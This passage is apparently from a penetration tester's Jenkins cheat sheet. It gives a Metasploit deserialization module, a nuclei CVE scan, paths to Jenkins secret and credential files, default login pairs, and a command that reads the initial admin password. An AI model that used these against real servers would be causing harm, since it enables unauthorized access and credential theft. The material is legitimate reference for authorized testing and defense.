### ei035wsrdmptl2zp8
```bash
use exploit/multi/http/jenkins_cli_deserialization
```

**Tags:** jenkins, cve, exploitation, deserialization
<!-- cmd: {"id":"ei035wsrdmptl2zp8","language":"bash","sectionId":"bz26i7mknmptl2z8k","tags":["jenkins","cve","exploitation","deserialization"]} -->

### bnecerqaomptl2zpe
```bash
nuclei -u http://$TARGET:8080 -tags jenkins,cve
```

**Tags:** jenkins, cve, exploitation, deserialization
<!-- cmd: {"id":"bnecerqaomptl2zpe","language":"bash","sectionId":"bz26i7mknmptl2z8k","tags":["jenkins","cve","exploitation","deserialization"]} -->

## Configuration Files (Linux)
<!-- section: {"id":"vy5f4jxzumptl2z8p","order":11,"collapsed":false} -->

### lwagmtifvmptl2zpv
```bash
/var/lib/jenkins/config.xml
```

_Configuration Files (Linux)_

**Tags:** jenkins, configuration, paths
<!-- cmd: {"id":"lwagmtifvmptl2zpv","language":"bash","sectionId":"vy5f4jxzumptl2z8p","tags":["jenkins","configuration","paths"]} -->

### 8hjdpasa0mptl2zq1
```bash
/var/lib/jenkins/credentials.xml
```

**Tags:** jenkins, configuration, paths
<!-- cmd: {"id":"8hjdpasa0mptl2zq1","language":"bash","sectionId":"vy5f4jxzumptl2z8p","tags":["jenkins","configuration","paths"]} -->

### 80hc05pq7mptl2zq7
```bash
/var/lib/jenkins/secrets/master.key
```

**Tags:** jenkins, configuration, paths
<!-- cmd: {"id":"80hc05pq7mptl2zq7","language":"bash","sectionId":"vy5f4jxzumptl2z8p","tags":["jenkins","configuration","paths"]} -->

### 1rz4nvo7cmptl2zqb
```bash
/var/lib/jenkins/secrets/hudson.util.Secret
```

**Tags:** jenkins, configuration, paths
<!-- cmd: {"id":"1rz4nvo7cmptl2zqb","language":"bash","sectionId":"vy5f4jxzumptl2z8p","tags":["jenkins","configuration","paths"]} -->

### ds6uyw94imptl2zqg
```bash
/var/lib/jenkins/users/*/config.xml
```

**Tags:** jenkins, configuration, paths
<!-- cmd: {"id":"ds6uyw94imptl2zqg","language":"bash","sectionId":"vy5f4jxzumptl2z8p","tags":["jenkins","configuration","paths"]} -->

### kz03vaw8cmptl2zql
```bash
/var/lib/jenkins/jobs/*/config.xml
```

**Tags:** jenkins, configuration, paths
<!-- cmd: {"id":"kz03vaw8cmptl2zql","language":"bash","sectionId":"vy5f4jxzumptl2z8p","tags":["jenkins","configuration","paths"]} -->

### tn9wujdhpmptl2zqp
```bash
/var/lib/jenkins/jobs/*/builds/*/log
```

**Tags:** jenkins, configuration, paths
<!-- cmd: {"id":"tn9wujdhpmptl2zqp","language":"bash","sectionId":"vy5f4jxzumptl2z8p","tags":["jenkins","configuration","paths"]} -->

### hhi999vuxmptl2zqu
```bash
/etc/default/jenkins
```

**Tags:** jenkins, configuration, paths
<!-- cmd: {"id":"hhi999vuxmptl2zqu","language":"bash","sectionId":"vy5f4jxzumptl2z8p","tags":["jenkins","configuration","paths"]} -->

### tlw2jtgn0mptl2zqz
```bash
~/.jenkins/
```

**Tags:** jenkins, configuration, paths
<!-- cmd: {"id":"tlw2jtgn0mptl2zqz","language":"bash","sectionId":"vy5f4jxzumptl2z8p","tags":["jenkins","configuration","paths"]} -->

## Default Credentials
<!-- section: {"id":"lznjl4xztmptl2z8w","order":12,"collapsed":false} -->

### r3tv9te44mptl2zri
```bash
admin    : admin
```

_Default Credentials_
<!-- cmd: {"id":"r3tv9te44mptl2zri","language":"bash","sectionId":"lznjl4xztmptl2z8w"} -->

### e1wgzcilrmptl2zrm
```bash
admin    : password
```
<!-- cmd: {"id":"e1wgzcilrmptl2zrm","language":"bash","sectionId":"lznjl4xztmptl2z8w"} -->

### it34qb6v7mptl2zrr
```bash
admin    : jenkins
```
<!-- cmd: {"id":"it34qb6v7mptl2zrr","language":"bash","sectionId":"lznjl4xztmptl2z8w"} -->

### paeei7z9dmptl2zrx
```bash
jenkins  : jenkins
```
<!-- cmd: {"id":"paeei7z9dmptl2zrx","language":"bash","sectionId":"lznjl4xztmptl2z8w"} -->

### rhqfypfvhmptl2zs2
```bash
admin    : (check /var/lib/jenkins/secrets/initialAdminPassword)
```
<!-- cmd: {"id":"rhqfypfvhmptl2zs2","language":"bash","sectionId":"lznjl4xztmptl2z8w"} -->

### tgw495ia8mptl2zs7
```bash
cat /var/lib/jenkins/secrets/initialAdminPassword
```

_Read initial admin password_

**Tags:** jenkins, default-credentials
<!-- cmd: {"id":"tgw495ia8mptl2zs7","language":"bash","sectionId":"lznjl4xztmptl2z8w","tags":["jenkins","default-credentials"]} -->
